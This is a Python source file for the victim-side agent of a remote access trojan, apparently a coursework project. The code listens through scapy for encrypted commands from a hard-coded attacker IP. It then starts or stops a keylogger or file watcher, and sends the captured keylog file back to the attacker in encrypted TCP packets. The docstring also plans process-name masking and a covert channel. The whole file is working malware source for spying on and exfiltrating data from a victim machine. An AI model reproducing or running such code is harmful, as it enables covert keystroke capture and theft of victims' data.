#!/usr/bin/env python3

"""
- Create attacker/victim programs
- Mask process name
- Probably use covert channel

- Menu:
    - Start/stop keylogger
    - Transfer file from victim to attacker
    - Start/stop watching file for changes. If change, transfer to attacker
    - Start/stop watching directory. If change, transfer to attacker

"""


from scapy.all import *
from multiprocessing import Process
import sys
import encryption as encryption
import keylog as keylogger
import watchfile as watchfile


is_running = False
process_list = []


def read_pkt(packet):
    global is_running

    payload = packet[Raw].load.decode("utf-8")
    payload_split = payload.split("|")

    data = ""

    # Additional data in payload (e.g., filenames)
    if len(payload_split) > 2:
        data = payload_split[1]
        data = encryption.decrypt_data(data.encode("utf-8"))
        data = data.decode("utf-8")

    # Parse functionality from attacker
    func = payload_split[0]
    func = encryption.decrypt_data(func.encode("utf-8"))
    func = func.decode("utf-8")

    if func == "quit":
        print("Shutdown signal received - exiting...")
        sys.exit()
    else:
        exec_function(func, data)


def send_file(mode, filename, chunks):
    with open(filename) as file:
        data = file.read()

    encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
    encrypted_data = encrypted_data.decode("utf-8")

    parts = [encrypted_data[i:i+chunks] for i in range(0, len(encrypted_data), chunks)]
    parts[-1] += ("$EOF" + mode)

    for part in parts:
        pkt = IP(dst="192.168.1.75")/TCP(sport=RandShort(), dport=8500)/part.encode("utf-8")
        send(pkt, verbose=False)


def exec_function(mode, *args):
    global is_running
    global process_list

    # Start functions
    if is_running == False:
        if mode == "keylog":
            print("Activate: ", mode)
            is_running = True
            keylogger.start_keylogger()
        
        elif mode == "watchfile":
            print("Activate: ", mode)
            is_running = True

            filename = args[0]
            watchfile_process = Process(target=watchfile.start_watchfile, args=(filename,))
            process_list.append(watchfile_process)
            process_list[0].start()

        elif mode == "watchdir":
            print("Activate: ", mode)
            is_running = True

        else:
            return

    # Stop functions
    elif is_running == True:
        if mode == "keylog":
            print("Stop: ", mode)
            is_running = False

            # Stop keylogger, and send log to attacker
            keylogger.stop_keylogger()
            send_file(mode, "keylog.txt", 1000)

        if mode == "watchfile":
            print("Stop: ", mode)
            is_running = False
            process_list[0].terminate()

        if mode == "watchdir":
            print("Stop: ", mode)
            is_running = False
            return

        else:
            return


def main():
    print("Listening...\n")

    while True:
        sniff(filter="ip and tcp and host 192.168.1.75 and dst port 8505", prn=read_pkt)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting program...")
        sys.exit()
